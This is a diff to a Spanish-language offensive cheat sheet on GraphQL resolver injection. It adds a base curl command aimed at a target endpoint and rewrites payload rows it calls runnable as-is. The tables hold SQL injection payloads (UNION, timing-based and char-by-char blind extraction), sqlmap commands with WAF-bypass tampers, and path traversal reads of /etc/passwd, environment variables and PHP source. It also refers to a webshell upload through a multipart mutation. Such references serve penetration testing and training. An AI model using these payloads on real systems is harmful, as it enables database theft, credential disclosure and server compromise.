@@ -23,6 +23,11 @@ linked:
 ---
 # GraphQL - Inyecciones via Resolvers
 
+> [!tip] Comando base
+> Los payloads `{"query":...}` se lanzan con:
+> `curl -sX POST -H 'Content-Type: application/json' -d '<BODY>' https://target/graphql`
+> Las filas con `sqlmap`, `curl`, `echo` o loops bash son comandos completos ejecutables tal cual.
+
 ---
 
 ## SQLi en Args de Query / Mutation
@@ -37,8 +42,8 @@ linked:
 | `{"query":"query{users(limit:\"10 UNION SELECT user,pass FROM users--\"){id}}"}` | LIMIT SQLi | Limit declarado como String. |
 | `{"query":"mutation{createUser(name:\"x',(SELECT pass FROM users))-- -\"){id}}"}` | INSERT SQLi extraction | Mutation con concat. |
 | `{"query":"query($f:JSON){items(filter:$f){id}}", "variables":{"f":{"role":"admin' OR '1'='1"}}}` | Bypass via JSON scalar | Resolver acepta JSON pasa al ORM. |
-| `' OR SLEEP(5)-- -` en cualquier String arg | Confirma SQLi blind por timing | No hay error visible. |
-| `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a` | Char-by-char extraction blind | Boolean oracle. |
+| `{"query":"query{user(username:\"x' OR SLEEP(5)-- -\"){id}}"}` | Confirma SQLi blind por timing (respuesta tarda 5s) | No hay error visible. |
+| `{"query":"query{user(username:\"x' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a\"){id}}"}` | Char-by-char extraction blind (boolean oracle) | Sin output directo. |
 | `sqlmap -r graphql.req --batch --risk 3 --level 5` | Auto-explotar SQLi | Request guardado de Burp con `*` en arg. |
 | `sqlmap -r graphql.req --tamper=between,space2comment` | Bypass WAF básico | Filter strip espacios. |
 | `sqlmap -r graphql.req --prefix='\"' --suffix='\"' --technique=BEUST` | Forzar quote handling | sqlmap confunde JSON quoting. |
@@ -123,7 +128,8 @@ done
 | `{"query":"query{readFile(path:\"../../../../etc/passwd\"){content}}"}` | LFI via path traversal | Resolver expone file read. |
 | `{"query":"query{readFile(path:\"php://filter/convert.base64-encode/resource=index.php\"){content}}"}` | Source code disclosure | PHP backend. |
 | `{"query":"query{readFile(path:\"/proc/self/environ\"){content}}"}` | Env vars + secrets | Linux backend. |
-| Multipart upload via spec → ver code block | File upload webshell | Mutation con `Upload!` scalar. |
+
+Webshell vía mutation con scalar `Upload!` (multipart, no usa el base JSON): ver **Multipart file upload (GraphQL spec)** abajo.
 ^graphql-inj-cmdi-ssrf
 
 ### Multipart file upload (GraphQL spec)
